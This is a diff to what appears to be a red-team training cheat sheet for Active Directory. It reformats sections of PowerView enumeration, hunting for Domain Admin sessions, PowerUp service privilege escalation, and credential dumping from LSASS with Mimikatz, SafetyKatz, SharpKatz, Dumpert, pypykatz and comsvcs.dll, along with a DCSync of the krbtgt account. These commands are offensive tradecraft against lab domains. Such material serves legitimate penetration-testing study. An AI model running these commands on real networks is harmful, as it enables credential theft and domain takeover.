@@ -160,126 +160,75 @@ C:\Users\Public\> AssemblyLoad.exe http://10.10.10.10/Loader.exe -path http://10
 
 ### PowerView Basic Enumeration
 
-###### Get current domain
+###### 
 
 ```powershell
+# Get current domain
 Get-NetDomain
-```
 
-###### Get object of another domain
-
-```poweshell
+# Get object of another domain
 Get-NetDomain -Domain xyz.local
-```
 
-###### Get domain SID for the current domain
-
-```powerhshell
+# Get domain SID for the current domain
 Get-DomainSID
-```
 
-###### Get DC for the current domain
-
-```powershell
+# Get DC for the current domain
 Get-NetDomainController
-```
 
-###### Get DC for another domain
-
-```powershell
+# Get DC for another domain
 Get-NetDomainController -Domain xyz.local
-```
 
-###### Get a list of users in the current domain
-
-```powershell
+# Get a list of users in the current domain
 Get-NetUser
 Get-NetUser -Username student1
-```
 
-###### Get list of all properties for users in the current domain
-
-```powershell
+# Get list of all properties for users in the current domain
 Get-UserProperty
 Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
-```
 
-###### Search for a particular string in a user's attributes
-
-```powershell
+# Search for a particular string in a user's attributes
 Find-UserField -SearchField Description -SearchTerm "built"
-```
 
-###### Get a list of computers in the current domain
-
-```powershell
+# Get a list of computers in the current domain
 Get-NetComputer
 Get-NetComputer -OperatingSystem "*Server 2016*"
 Get-NetComputer -Ping
 Get-NetComputer -FullData
-```
 
-
-###### Get all the groups in the current domain
-
-```powershell
+# Get all the groups in the current domain
 Get-NetGroup
 Get-NetGroup -Domain <targetdomain>
 Get-NetGroup -FullData
 Get-NetComputer -Domain
-```
 
-###### Get all groups containing the word "admin" in group name
-
-```powershell
+# Get all groups containing the word "admin" in group name
 Get-NetGroup *admin*
 Get-NetGroup -GroupName *admin*
 Get-NetGroup *admin* -FullData
 Get-NetGroup -GroupName *admin* -Doamin xyz.local
-```
 
-###### Get all the members of the Domain Admins group
-
-```powershell
+# Get all the members of the Domain Admins group
 Get-NetGroupMember -GroupName "Domain Admins" -Recurse
 Get-NetGroupMember -GroupName "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members
-```
 
-
-###### Get the group membership for a user
-
-```powershell
+# Get the group membership for a user
 Get-NetGroup -UserName "student1"
-```
 
-###### List all the local groups on a machine (needs admin privilege) 
-
-```powershell
+# List all the local groups on a machine (needs admin privilege) 
 Get-NetLocalGroup -ComputerName dcorp-dc.abc.xyz.local -ListGroups
-```
 
-###### Get members of all the local groups on a machine (needs admin privilege)
 
-```powershell
+# Get members of all the local groups on a machine (needs admin privilege)
 Get-NetLocalGroup -ComputerName dcorp-dc.abc.xyz.local -Recurse
-```
 
-###### Get actively logged users on a computer (needs local admin rights)
-
-```powershell
+# Get actively logged users on a computer (needs local admin rights)
 Get-NetLoggedon -ComputerName dcorp-dc.abc.xyz.local 
-```
 
-###### Find sensitive files and shares in current domain.
-
-```powershell
+# Find sensitive files and shares in current domain.
 Invoke-ShareFinder -Verbose
 Invoke-FileFinder -Verbose
-```
 
-###### Get all fileservers of the domain
-
-```powershell
+# Get all fileservers of the domain
 Get-NetFileServer
 ```
 
@@ -361,82 +310,51 @@ Get-PathAcl -Path "\\dcorp-dc.abc.xyz.local\sysvol"
 
 ### PowerView Trust Enumeration
 
-##### Get a list of all domain trusts for the current domain
+##### 
 
 ```powershell
+# Get a list of all domain trusts for the current domain
 Get-NetDomainTrust
 Get-NetDomainTrust -Domain us.abc.xyz.local
-```
 
-##### Get details about the current forest
-
-```powershell
+# Get details about the current forest
 Get-NetForest
 Get-NetForest -Forest eurocorp.local
-```
 
-##### Get all domains in the current forest
-
-```powershell
+# Get all domains in the current forest
 Get-NetForestDomain
 Get-NetForestDomain -Forest eurocorp.local
-```
 
-##### Get all global catalogs for the current forest
-
-```powershell
+# Get all global catalogs for the current forest
 Get-NetForestCatalog
 Get-NetForestCatalog -Forest eurocorp.local
-```
 
-##### Map trusts of a forest
-
-```powershell
+# Map trusts of a forest
 Get-NetForestTrust
 Get-NetForestTrust -Forest eurocorp.local
-```
 
-##### Find all machines on the current domain where the current user has local admin access
-
-```powershell
+# Find all machines on the current domain where the current user has local admin access
 Find-LocalAdminAccess -Verbose
-```
 
-##### Find computers where a domain admin (or specified user/group) has sessions
+# Find computers where a domain admin (or specified user/group) has sessions
 
-```powershell
 Invoke-UserHunter
 Invoke-UserHunter -GroupName "RDPUsers"
-```
 
-##### To confirm admin access
-
-```powershell
+# To confirm admin access
 Invoke-UserHunter -CheckAccess
-```
 
-##### Find computers where a domain admin is logged-in
-
-```powershell
+# Find computers where a domain admin is logged-in
 Invoke-UserHunter -Stealth
-```
 
-##### Find computers where a domain admin (or specified user/group) has sessions
-
-```powershell
+# Find computers where a domain admin (or specified user/group) has sessions
 Find-DomainUserLocation -Verbose
 Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
-```
 
-##### Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess)
-
-```powershell
+# Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess)
 Find-DomainUserLocation -CheckAccess
-```
 
-##### Find computers (File Servers and Distributed File servers) where a domain admin session is available.
-
-```powershell
+# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
 Find-DomainUserLocation –Stealth
 ```
 
@@ -444,22 +362,17 @@ Find-DomainUserLocation –Stealth
 
 ### Service Path Privilege Escalation using PowerUp
 
-##### Get services with unquoted paths and a space in their name.
+##### 
 
 ```powershell
+# Get services with unquoted paths and a space in their name.
 Get-ServiceUnquoted -Verbose
 Get-WmiObject -class win32_service | select pathname (wmi command/lists all paths)
-```
 
-##### Get services where the current user can write to its binary path or change arguments to the binary
-
-```powershell
+# Get services where the current user can write to its binary path or change arguments to the binary
 Get-ModifiableServiceFile -Verbose
-```
 
-##### Get the services whose configuration current user can modify
-
-```powershell
+# Get the services whose configuration current user can modify
 Get-ModifiableService -Verbose
 ```
 
@@ -611,15 +524,11 @@ C:\> winrs -remote:us-mgmt -u:us\administrator - p:Pass@1234 cmd.exe
 
 ### Lateral Movement [ `Invoke-Mimikatz`, `SafetyKatz`, `Rubeus.exe` ]
 
-##### Dump credentials on a local machine
-
 ```powershell
+# Dump credentials on a local machine
 Invoke-Mimikatz -DumpCreds
-```
 
-##### Dump credentials on multiple remote machines
-
-```powershell
+# Dump credentials on multiple remote machines
 Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
 ```
 
@@ -666,50 +575,42 @@ SafetyKatz_old.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 
 ##### Invoke-Mimikatz
 
-###### 1. Dump credentials on a local machine using Mimikatz
-
 ```powershell
+# 1. Dump credentials on a local machine using Mimikatz
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 
 ##### SafetyKatz & SharpKatz
 
-###### 2. Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
-
 ```powershell
+# 2. Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
 SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
 
 # SafetyKatz Old (For Windows 2020 Server)
 SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
-```
 
-###### 3. Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality)
-
-```powershell
+# 3. Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality)
 SharpKatz.exe -Command ekeys
 ```
 
 ##### Dumpert
 
-###### 4. Dump credentials using Dumpert (Direct System Calls and API unhooking)
-
 ```powershell
+# 4. Dump credentials using Dumpert (Direct System Calls and API unhooking)
 rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
 ```
 
 ##### pypykatz
 
-###### 5. Using pypykatz (Mimikatz functionality in Python)
-
 ```powershell
+# 5. Using pypykatz (Mimikatz functionality in Python)
 pypykatz.exe live lsa
 ```
 
 ##### comsvcs.dll
 
-###### 6. Using comsvcs.dll
-
 ```powershell
+# 6. Using comsvcs.dll
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
 ```
@@ -730,9 +631,8 @@ sekurlsa::ekeys
 
 ##### SharpKatz
 
-###### 7. Using SharpKatz.exe to do DCSync Attack
-
 ```powershell
+# 7. Using SharpKatz.exe to do DCSync Attack
 SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
 ```
 
